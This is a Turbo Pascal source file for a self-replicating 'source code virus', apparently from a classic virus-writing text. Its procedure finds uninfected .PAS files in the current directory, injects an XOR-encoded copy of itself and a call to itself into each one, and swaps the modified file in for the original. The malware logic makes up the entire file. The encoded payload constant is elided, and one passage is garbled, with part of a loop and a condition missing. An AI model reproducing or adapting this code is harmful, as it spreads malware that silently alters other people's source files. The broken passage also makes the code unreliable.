program source_code_virus;      {This is a source code virus in Turbo Pascal}

uses dos;                       {DOS unit required for file searches}


{The following is the procedure "virus" rendered byte by byte as a constant.
 This is required to keep the source code in the executable file when
 compiled. The constant is generated using the ENCODE.PAS program.}
const
 tconst:array[1..8419] of byte=(92,226,56,38,54,34,32,
    38,234,12,44,6,56,14,80,234,234,234,234,234,234,234,234,234,234,
    . . . .  (USE ENCODE TO BUILD THIS CONSTANT . . . .
    92,116,102,234,70,120,78,64,76,80,176,190,92,226,32,54,34,56,
    38,80,176,190,176,190);


{This is the actual viral procedure, which goes out and finds a .PAS file
 and infects it}

{$IFNDEF SCVIR}              {Make sure an include file doesn't also have it}
{$DEFINE SCVIR}
PROCEDURE VIRUS;             {This must be in caps or it won't be recognized}
var
  fn               :string;     {File name string}
  filetype         :char;       {D=DOS program, U=Uni}
  uses_flag        :boolean;    {Indicates whether "uses" statement present}

  {This sub-procedure makes a string upper case}
  function UpString(s:string):string;
  var j:byte;
  begin
    for j:=1 to length(s) do s[j]:=UpCase(s[j]);    {Just use UpCase for the}
    UpString:=s;                                               {whole length}
  end;

  {This function determines whether it is OK to attach the virus to a given
   file, as passed to the procedure in its parameter. If OK, it returns TRUE.
   The only condition is whether or not the file has already been infected.
   This routine determines whether the file has been infected by searching
   the file for "PROCEDURE VIRUS;", the virus procedure. If found, it assumes
   the program is infected. While scanning the file, this routine also sets
   the uses_flag, which is true if there is already a "uses" statement in
   the program.}
  function ok_to_attach(file_name:string):boolean;
  var
    host_file      :text;
    txtline        :string;
  begin
    assign(host_file,file_name);
    reset(host_file);                                         {open the file}
    uses_flag:=false;
    ok_to_attach:=true;                              {assume it's uninfected}
    repeat                                                    {scan the file}
      readln(host_file,txtline);
      txtline:=UpString(txtline);
      if pos('USES ',txtline)>0 then uses_flag:=true;           {Find "uses"}
      if pos('PROCEDURE VIRUS;',txtline)>0 then         {and virus procedure}
        ok_to_attach:=false;
    until eof(host_file);
    close(host_file);
  end;

  {This function searches the current directory to find a pascal file that
   has not been infected yet. It calls the function ok_to_attach in order
   to determine whether or not a given file has already been infected. It
   returns TRUE if it successfully found a file, and FALSE if it did not.
   If it found a file, it returns the name in fn.}
  function find_pascal_file:boolean;
  var
    sr             :SearchRec;                            {From the DOS unit}
  begin
    FindFirst('*.PAS',AnyFile,sr);                   {Search for pascal file}
    while (DosError=0) and (not ok_to_attach(sr.name)) do   {until one found}
      FindNext(sr);                                  {or no more files found}
    if DosError=0 then
      begin
        fn:=sr.name;                                 {successfully found one}
        find_pascal_file:=true;                        {so set name and flag}
      end
    else find_pascal_file:=false;                {else none found - set flag}
  end;

  {This is the routine which actually attaches the virus to a given file.}
  procedure append_virus;
  var
    f,ft           :text;
    l,t,lt         :string;
    j              :word;
    cw,                               {flag to indicate constant was written}
    pw,                              {flag to indicate procedure was written}
    uw,                         {flag to indicate uses statement was written}
    intf,                            {flag to indicate "interface" statement}
    impf,                       {flag to indicate "implementation" statement}
    comment        :boolean;
  begin
    assign(f,fn);
    reset(f);                                                 {open the file}
    assign(ft,'temp.aps');
    rewrite(ft);                                  {open a temporary file too}
    cw:=false;
    pw:=false;
    uw:=false;
    impf:=false;
    intf:=false;
    filetype:=' ';                                         {initialize flags}
    repeat
      readln(f,l);
      if t<>'' then lt:=t;
      t:=UpString(l);                     {look at all strings in upper case}
      comment:=false;
      for j:=1 to length(t) do         {blank out all comments in the string}
        begin
          if t[j]='{' then comment:=true;
          if t[j]='}' then
            begin
              comment:=false;
              t[j]:=' ';
            end;
          if comment then t[j]:=' ';
        end;
      if (filetype='D') and (not (uses_flag or uw)) then  {put "uses" in pgm}
        begin                                          {if not already there}
          writeln(ft,'uses dos;');
          uw:=true;
        end;
      if (filetype='U') and (not (uses_flag or uw))     {put "uses" in unit}
       and (intf) then
        begin                                          {if not already there}
          writeln(ft,'uses dos;');
          uw:=true;
        end;
      if (filetype=' ') and (pos('PROGRAM',t)>0) then
        filetype:='D';                                  {it is a DOS program}
      if (filetype=' ') and (pos('UNIT',t)>0) then
        filetype:='U';                                  {it is a pascal unit}
      if (filetype='U') and (not intf) and (pos('INTERFACE',t)>0) then
        intf:=true;                      {flag interface statement in a unit}
      if (filetype='U') and (not impf) and (pos('IMPLEMENTATION',t)>0) then
        impf:=true;                 {flag implementation statement in a unit}
      if uses_flag and (pos('USES',t)>0) then   {put "DOS" in uses statement}
        begin
          uw:=true;
          if pos('DOS',t)=0 then                                  {if needed}
            l:=copy(l,1,pos(';',l)-1)+',dos;';
        end;
      if ((pos('CONST',t)>0) or (pos('TYPE',t)>0) or (pos('VAR',t)>0)
       or (impf and (pos('IMPLEMENTATION',t)=0))) and (not cw) then
        begin
          cw:=true;                                {put the constant form of}
          writeln(ft,'{$IFNDEF SCVIRC}');  {conditional compile for constant}
          writeln(ft,'{$DEFINE SCVIRC}');
          writeln(ft,'const');                       {the viral procedure in}
          write(ft,'  tconst     :array[1..',sizeof(tconst),'] of byte=(');
          for j:=1 to sizeof(tconst) do
            begin
              write(ft,tconst[j]);
              if j0)                               {in a unit}
             or (pos('FUNCTION',t)>0)
             or (pos('BEGIN',t)>0)
             or (pos('END.',t)>0))
        and (impf)
        and (not pw) then
          begin
            pw:=true;
            for j:=1 to sizeof(tconst) do
              write(ft,chr((tconst[j] xor $AA) shr 1));
          end;
      if (filetype='D')                   {write viral procedure to the file}
        and ((pos('PROCEDURE',t)>0)                            {in a program}
             or (pos('FUNCTION',t)>0)
             or (pos('BEGIN',t)>0))
        and (not pw) then
          begin
            pw:=true;
            for j:=1 to sizeof(tconst) do
              write(ft,chr((tconst[j] xor $AA) shr 1));
          end;
      if pos('END.',t)>0 then       {write call to virus into main procedure}
        begin
          if (pos('END',lt)>0) and (filetype='U') then writeln(ft,'begin');
          t:='virus;';
          for j:=1 to pos('END.',UpString(l))+1 do t:=' '+t;
          writeln(ft,t);
        end;
      writeln(ft,l);
    until eof(f);
    close(f);                                                     {close file}
    close(ft);                                          {close temporary file}
    erase(f);                         {Substitute temp file for original file}
    rename(ft,fn);
  end;

begin {of virus}
  if find_pascal_file then                   {if an infectable file is found}
    append_virus;                                            {then infect it}
end;  {of virus}
{$ENDIF}

begin {of main}
  virus;                                 {this program just starts the virus}
end.  {of main}
